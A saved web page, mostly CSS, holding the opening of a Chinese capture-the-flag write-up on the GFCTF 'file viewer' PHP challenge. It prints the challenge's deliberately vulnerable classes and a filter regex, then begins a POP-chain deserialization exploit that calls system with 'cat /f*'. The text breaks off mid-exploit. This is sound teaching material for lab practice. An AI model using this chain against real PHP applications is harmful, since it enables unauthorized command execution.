cubic-bezier(.645,.045,.355,1)}.el-textarea__inner::-webkit-input-placeholder{color:#C0C4CC}.el-textarea__inner:-ms-input-placeholder{color:#C0C4CC}.el-textarea__inner::-ms-input-placeholder{color:#C0C4CC}.el-textarea__inner::placeholder{color:#C0C4CC}.el-textarea__inner:hover{border-color:#C0C4CC}.el-textarea__inner:focus{outline:0;border-color:#409EFF}.el-textarea .el-input__count{color:#909399;background:#FFF;position:absolute;font-size:12px;bottom:5px;right:10px}.el-textarea.is-disabled .el-textarea__inner{background-color:#F5F7FA;border-color:#E4E7ED;color:#C0C4CC;cursor:not-allowed}.el-textarea.is-disabled .el-textarea__inner::-webkit-input-placeholder{color:#C0C4CC}.el-textarea.is-disabled .el-textarea__inner:-ms-input-placeholder{color:#C0C4CC}.el-textarea.is-disabled .el-textarea__inner::-ms-input-placeholder{color:#C0C4CC}.el-textarea.is-disabled .el-textarea__inner::placeholder{color:#C0C4CC}.el-textarea.is-exceed .el-textarea__inner{border-color:#F56C6C}.el-textarea.is-exceed .el-input__count{color:#F56C6C}.el-input{position:relative;font-size:14px;display:inline-block;width:100%}.el-input::-webkit-scrollbar{z-index:11;width:6px}.el-input::-webkit-scrollbar:horizontal{height:6px}.el-input::-webkit-scrollbar-thumb{border-radius:5px;width:6px;background:#b4bccc}.el-input::-webkit-scrollbar-corner{background:#fff}.el-input::-webkit-scrollbar-track{background:#fff}.el-input::-webkit-scrollbar-track-piece{background:#fff;width:6px}.el-input .el-input__clear{color:#C0C4CC;font-size:14px;cursor:pointer;-webkit-transition:color .2s cubic-bezier(.645,.045,.355,1);transition:color .2s cubic-bezier(.645,.045,.355,1)}.el-input .el-input__clear:hover{color:#909399}.el-input .el-input__count{height:100%;display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;color:#909399;font-size:12px}.el-input .el-input__count .el-input__count-inner{background:#FFF;line-height:initial;display:inline-block;padding:0 5px}.el-input__inner{-webkit-appearance:none;background-color:#FFF;background-image:none;border-radius:4px;border:1px solid #DCDFE6;-webkit-box-sizing:border-box;box-sizing:border-box;color:#606266;display:inline-block;font-size:inherit;height:40px;line-height:40px;outline:0;padding:0 15px;-webkit-transition:border-color .2s cubic-bezier(.645,.045,.355,1);transition:border-color .2s cubic-bezier(.645,.045,.355,1);width:100%}.el-input__prefix,.el-input__suffix{position:absolute;top:0;-webkit-transition:all .3s;text-align:center;height:100%;color:#C0C4CC}.el-input__inner::-ms-reveal{display:none}.el-input__inner::-webkit-input-placeholder{color:#C0C4CC}.el-input__inner:-ms-input-placeholder{color:#C0C4CC}.el-input__inner::-ms-input-placeholder{color:#C0C4CC}.el-input__inner::placeholder{color:#C0C4CC}.el-input__inner:hover{border-color:#C0C4CC}.el-input.is-active .el-input__inner,.el-input__inner:focus{border-color:#409EFF;outline:0}.el-input__suffix{right:5px;transition:all .3s;pointer-events:none}.el-input__suffix-inner{pointer-events:all}.el-input__prefix{left:5px;transition:all .3s}.el-input__icon{height:100%;width:25px;text-align:center;-webkit-transition:all .3s;transition:all .3s;line-height:40px}.el-input__icon:after{content:'';height:100%;width:0;display:inline-block;vertical-align:middle}.el-input__validateIcon{pointer-events:none}.el-input.is-disabled .el-input__inner{background-color:#F5F7FA;border-color:#E4E7ED;color:#C0C4CC;cursor:not-allowed}.el-input.is-disabled .el-input__inner::-webkit-input-placeholder{color:#C0C4CC}.el-input.is-disabled .el-input__inner:-ms-input-placeholder{color:#C0C4CC}.el-input.is-disabled .el-input__inner::-ms-input-placeholder{color:#C0C4CC}.el-input.is-disabled .el-input__inner::placeholder{color:#C0C4CC}.el-input.is-disabled .el-input__icon{cursor:not-allowed}.el-input.is-exceed .el-input__inner{border-color:#F56C6C}.el-input.is-exceed .el-input__suffix .el-input__count{color:#F56C6C}.el-input--suffix .el-input__inner{padding-right:30px}.el-input--prefix .el-input__inner{padding-left:30px}.el-input--medium{font-size:14px}.el-input--medium .el-input__inner{height:36px;line-height:36px}.el-input--medium .el-input__icon{line-height:36px}.el-input--small{font-size:13px}.el-input--small .el-input__inner{height:32px;line-height:32px}.el-input--small .el-input__icon{line-height:32px}.el-input--mini{font-size:12px}.el-input--mini .el-input__inner{height:28px;line-height:28px}.el-input--mini .el-input__icon{line-height:28px}.el-input-group{line-height:normal;display:inline-table;width:100%;border-collapse:separate;border-spacing:0}.el-input-group>.el-input__inner{vertical-align:middle;display:table-cell}.el-input-group__append,.el-input-group__prepend{background-color:#F5F7FA;color:#909399;vertical-align:middle;display:table-cell;position:relative;border:1px solid #DCDFE6;border-radius:4px;padding:0 20px;width:1px;white-space:nowrap}.el-input-group--prepend .el-input__inner,.el-input-group__append{border-top-left-radius:0;border-bottom-left-radius:0}.el-input-group--append .el-input__inner,.el-input-group__prepend{border-top-right-radius:0;border-bottom-right-radius:0}.el-input-group__append:focus,.el-input-group__prepend:focus{outline:0}.el-input-group__append .el-button,.el-input-group__append .el-select,.el-input-group__prepend .el-button,.el-input-group__prepend .el-select{display:inline-block;margin:-10px -20px}.el-input-group__append button.el-button,.el-input-group__append div.el-select .el-input__inner,.el-input-group__append div.el-select:hover .el-input__inner,.el-input-group__prepend button.el-button,.el-input-group__prepend div.el-select .el-input__inner,.el-input-group__prepend div.el-select:hover .el-input__inner{border-color:transparent;background-color:transparent;color:inherit;border-top:0;border-bottom:0}.el-input-group__append .el-button,.el-input-group__append .el-input,.el-input-group__prepend .el-button,.el-input-group__prepend .el-input{font-size:inherit}.el-input-group__prepend{border-right:0}.el-input-group__append{border-left:0}.el-input-group--append .el-select .el-input.is-focus .el-input__inner,.el-input-group--prepend .el-select .el-input.is-focus .el-input__inner{border-color:transparent}.el-input__inner::-ms-clear{display:none;width:0;height:0}</style><style type="text/css">.el-loading-parent--relative{position:relative!important}.el-loading-parent--hidden{overflow:hidden!important}.el-loading-mask{position:absolute;z-index:2000;background-color:rgba(255,255,255,.9);margin:0;top:0;right:0;bottom:0;left:0;-webkit-transition:opacity .3s;transition:opacity .3s}.el-loading-mask.is-fullscreen{position:fixed}.el-loading-mask.is-fullscreen .el-loading-spinner{margin-top:-25px}.el-loading-mask.is-fullscreen .el-loading-spinner .circular{height:50px;width:50px}.el-loading-spinner{top:50%;margin-top:-21px;width:100%;text-align:center;position:absolute}.el-loading-spinner .el-loading-text{color:#409EFF;margin:3px 0;font-size:14px}.el-loading-spinner .circular{height:42px;width:42px;-webkit-animation:loading-rotate 2s linear infinite;animation:loading-rotate 2s linear infinite}.el-loading-spinner .path{-webkit-animation:loading-dash 1.5s ease-in-out infinite;animation:loading-dash 1.5s ease-in-out infinite;stroke-dasharray:90,150;stroke-dashoffset:0;stroke-width:2;stroke:#409EFF;stroke-linecap:round}.el-loading-spinner i{color:#409EFF}.el-loading-fade-enter,.el-loading-fade-leave-active{opacity:0}@-webkit-keyframes loading-rotate{100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes loading-rotate{100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes loading-dash{0%{stroke-dasharray:1,200;stroke-dashoffset:0}50%{stroke-dasharray:90,150;stroke-dashoffset:-40px}100%{stroke-dasharray:90,150;stroke-dashoffset:-120px}}@keyframes loading-dash{0%{stroke-dasharray:1,200;stroke-dashoffset:0}50%{stroke-dasharray:90,150;stroke-dashoffset:-40px}100%{stroke-dasharray:90,150;stroke-dashoffset:-120px}}</style><style type="text/css">/*!
+ * OwO v1.0.2
+ * Source: https://github.com/DIYgod/OwO/blob/master/dist/OwO.min.css
+ * Author: DIYgod
+ * Modified by: iMaeGoo
+ * Released under the MIT License.
+ */
+
+.OwO {
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+.OwO.OwO-open .OwO-body {
+  display: block;
+}
+
+.OwO .OwO-logo {
+  width: 1.125em;
+  display: flex;
+}
+
+.OwO .OwO-body {
+  display: none;
+  position: absolute;
+  left: 0;
+  right: 0;
+  max-width: 500px;
+  color: #4a4a4a;
+  background-color: #ffffff;
+  border: 1px solid rgba(144,147,153,0.31);
+  top: 2em;
+  border-radius: 0 4px 4px;
+  z-index: 1000;
+}
+
+.night .OwO .OwO-body,
+.darkmode .OwO .OwO-body,
+.DarkMode .OwO .OwO-body,
+[data-theme="dark"] .OwO .OwO-body,
+[data-user-color-scheme="dark"] .OwO .OwO-body {
+  color: #ffffff;
+  background-color: #4a4a4a;
+}
+
+.OwO .OwO-body .OwO-items {
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  display: none;
+  padding: 10px;
+  padding-right: 0;
+  margin: 0;
+  overflow: auto;
+  font-size: 0;
+}
+
+.OwO .OwO-body .OwO-items .OwO-item {
+  list-style-type: none;
+  padding: 5px 10px;
+  border-radius: 5px;
+  display: inline-block;
+  font-size: 12px;
+  line-height: 14px;
+  margin: 0 10px 12px 0;
+  cursor: pointer;
+  -webkit-transition: .3s;
+  transition: .3s;
+}
+
+.OwO .OwO-body .OwO-items .OwO-item:hover {
+  background-color: rgba(144,147,153,0.13);
+  box-shadow: 0 2px 2px 0 rgba(0,0,0,.14),0 3px 1px -2px rgba(0,0,0,.2),0 1px 5px 0 rgba(0,0,0,.12);
+}
+
+.OwO .OwO-body .OwO-items-emoji .OwO-item {
+  font-size: 20px;
+  line-height: 19px;
+}
+
+.OwO .OwO-body .OwO-items-image .OwO-item {
+  max-width: calc(25% - 10px);
+  box-sizing: border-box;
+}
+
+.OwO .OwO-body .OwO-items-image .OwO-item img {
+  max-width: 100%;
+}
+
+.OwO .OwO-body .OwO-items-show {
+  display: block;
+}
+
+.OwO .OwO-body .OwO-bar {
+  width: 100%;
+  border-top: 1px solid rgba(144,147,153,0.31);
+  border-radius: 0 0 4px 4px;
+}
+
+.OwO .OwO-body .OwO-bar .OwO-packages {
+  margin: 0;
+  padding: 0;
+  font-size: 0;
+}
+
+.OwO .OwO-body .OwO-bar .OwO-packages li {
+  list-style-type: none;
+  display: inline-block;
+  line-height: 30px;
+  font-size: 14px;
+  padding: 0 10px;
+  cursor: pointer;
+  margin-right: 3px;
+}
+
+.OwO .OwO-body .OwO-bar .OwO-packages li:nth-child(1) {
+  border-radius: 0 0 0 3px;
+}
+
+.OwO .OwO-body .OwO-bar .OwO-packages li:hover {
+  background-color: rgba(144,147,153,0.13);
+}
+
+.OwO .OwO-body .OwO-bar .OwO-packages .OwO-package-active {
+  background-color: rgba(144,147,153,0.13);
+  -webkit-transition: .3s;
+  transition: .3s;
+}
+</style><script type="text/javascript" defer="" src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/busuanzi"></script><style type="text/css">.heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}</style><script type="text/javascript" charset="utf-8" async="" src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/L2Dwidget.0.min.js.下载"></script>
+<style>
+  .live2d-widget-dialog-container {
+    width: 300px;
+    height: 120px;
+    position: absolute;
+    bottom: 65%;
+    right: 0px;
+    transform-origin: right;
+    padding: 12px;
+    box-sizing: border-box;
+    -webkit-font-smoothing: antialiased;
+  }
+  .live2d-widget-dialog {
+    width: 100%;
+    height: 100%;
+    color: #917159;
+    font-size: 16px;
+    padding: 12px;
+    border: 2px solid rgb(236, 203, 180);
+    background: rgb(252, 248, 244);
+    box-sizing: border-box;
+    border-radius: 10px;
+    transform: rotate(-2deg);
+    opacity: 0;
+    transition: 200ms opacity;
+    box-shadow: rgba(0, 0, 0, 0.12) 0px 1px 6px, rgba(0, 0, 0, 0.12) 0px 1px 4px;
+    animation: live2d-widget-dialog-tingle 4s ease-in-out 0s infinite alternate;
+  }
+  @keyframes live2d-widget-dialog-tingle {
+    0% { transform: translate(-1px, 1.5px) rotate(-2deg); }
+    100% { transform: translate(1px, -1.5px) rotate(2deg); }
+  }
+</style>
+</head>
+  <body class="pace-running"><div class="pace pace-inactive"><div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">
+  <div class="pace-progress-inner"></div>
+</div>
+<div class="pace-activity"></div></div>
+
+
+
+
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article id="post-WP篇之解析GFCTF---文件查看器" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  WP篇之解析GFCTF---文件查看器
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/" class="article-date">
+  <time datetime="2021-11-28T16:00:00.000Z" itemprop="datePublished">2021-11-29</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">15 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"><ol class="toc-list "><li class="toc-list-item is-active-li"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#%E8%A7%A3%E6%9E%90GFCTF%E2%80%94%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8" class="toc-link node-name--H1  is-active-link">解析GFCTF—文件查看器</a><ol class="toc-list  is-collapsible"><li class="toc-list-item"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#%E6%9E%84%E9%80%A0pop%E9%93%BE" class="toc-link node-name--H2 ">构造pop链</a></li><li class="toc-list-item"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#php-filter%E6%B7%B7%E5%90%88%E4%BD%BF%E7%94%A8%E5%90%83%E6%8E%89%E8%84%8F%E6%95%B0%E6%8D%AE" class="toc-link node-name--H2 ">php://filter混合使用吃掉脏数据</a></li><li class="toc-list-item"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E8%A7%A6%E5%8F%91-desctruct" class="toc-link node-name--H2 ">GC回收机制触发__desctruct</a></li><li class="toc-list-item"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#%E5%BC%80%E5%86%B2" class="toc-link node-name--H2 ">开冲</a></li></ol></li></ol></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="解析GFCTF—文件查看器"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#%E8%A7%A3%E6%9E%90GFCTF%E2%80%94%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8" class="headerlink" title="解析GFCTF—文件查看器"></a>解析GFCTF—文件查看器</h1><p>之前那篇文章写了<code>GC</code>回收机制与<code>phar</code>反序列化，正好校赛中就有一道这种类型的题，那么我们就来详细聊聊这道题，这道题在比赛的时候是零解，它需要的其它知识点会在文章中慢慢介绍</p>
+<span id="more"></span>
+
+<p>这道题可以在<code>Xenny</code>师傅的平台上复现：<a target="_blank" rel="noopener" href="https://www.ctfer.vip/">https://www.ctfer.vip/</a>，题目进去之后首先是一个登录框。直接<code>admin admin</code>，登陆进去，然后就<code>www.zip</code>下载源码，源码如下，<code>User.class.php</code>：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><button class="btn-copy" data-clipboard-snippet=""><i class="ri-file-copy-2-line"></i><span>COPY</span></button><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">"view/login.html"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'password'</span>])){</span><br><span class="line">                <span class="keyword">$this</span>-&gt;username=<span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;password=<span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check()){</span><br><span class="line">                    header(<span class="string">"location:./?c=Files&amp;m=read"</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="string">"admin"</span> &amp;&amp; <span class="keyword">$this</span>-&gt;password===<span class="string">"admin"</span>){</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"<span class="subst">{$this-&gt;username}</span>的密码不正确或不存在该用户"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">            (@<span class="keyword">$this</span>-&gt;password)();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>{ </span><br><span class="line">            (<span class="variable">$name</span>)();</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>Myerror.class.php</code>：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><button class="btn-copy" data-clipboard-snippet=""><i class="ri-file-copy-2-line"></i><span>COPY</span></button><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Myerror</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$message</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">            ini_set(<span class="string">'error_log'</span>,<span class="string">'/var/www/html/log/error.txt'</span>);</span><br><span class="line">            ini_set(<span class="string">'log_errors'</span>,<span class="number">1</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable">$test</span>=<span class="keyword">$this</span>-&gt;message-&gt;{<span class="keyword">$this</span>-&gt;test};</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"test"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>Files.class.php</code>：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><button class="btn-copy" data-clipboard-snippet=""><i class="ri-file-copy-2-line"></i><span>COPY</span></button><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Files</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">$this</span>-&gt;log();</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">"view/file.html"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'file'</span>])){</span><br><span class="line">                <span class="keyword">$this</span>-&gt;filename=<span class="variable">$_POST</span>[<span class="string">'file'</span>];</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"请输入文件名"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="variable">$contents</span>=<span class="keyword">$this</span>-&gt;getFile();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;textarea class="file_content" type="text" value='</span>.<span class="string">"&lt;br&gt;"</span>.<span class="variable">$contents</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">'/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i'</span>,<span class="keyword">$this</span>-&gt;filename)){</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"这不合理"</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable">$contents</span>=file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'write'</span>])){</span><br><span class="line">                file_put_contents(<span class="keyword">$this</span>-&gt;filename,<span class="variable">$contents</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$contents</span>)){</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"该文件不存在或者内容为空"</span>);</span><br><span class="line">            } </span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable">$log</span>=<span class="keyword">new</span> Myerror();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>{</span><br><span class="line">            (<span class="variable">$key</span>)(<span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="构造pop链"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#%E6%9E%84%E9%80%A0pop%E9%93%BE" class="headerlink" title="构造pop链"></a>构造pop链</h2><p>先来简单分析分析这代码吧，毫无疑问这是一条<code>pop</code>的链子，而且这条链子还挺简单的，这里就简单分析下：</p>
+<p>链子肯定还是首先先找头和尾，头部在<code>User</code>类的<code>__desctruct</code>中，然后尾部是在<code>Files</code>类中的<code>__get</code>中，里面可以执行任意命令；头部首先进入了<code>__desctruct()</code>后，可以通过数组的形式访问任意类的任意方法，那我们就让它访问<code>User</code>类的<code>check()</code>方法中，然后这里有<code>echo</code>，以字符串的形式输出对象，然后就会跳到<code>Myerror</code>类中的<code>__tostring()</code>方法中，然后它里面的<code>$this-&gt;test</code>是可控的，我们让它等于一个<code>Files</code>类里面没有的属性就行了，就可以直接调用<code>__get</code>方法了，并且给<code>$key</code>赋值，所以说现在的<code>exp</code>为：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><button class="btn-copy" data-clipboard-snippet=""><i class="ri-file-copy-2-line"></i><span>COPY</span></button><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Files</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg = <span class="string">'cat /f*'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myerror</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$message</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">$this</span> -&gt; test = <span class="string">'system'</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; message = <span class="keyword">new</span> Files();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>{</span><br><span class="line">    <span 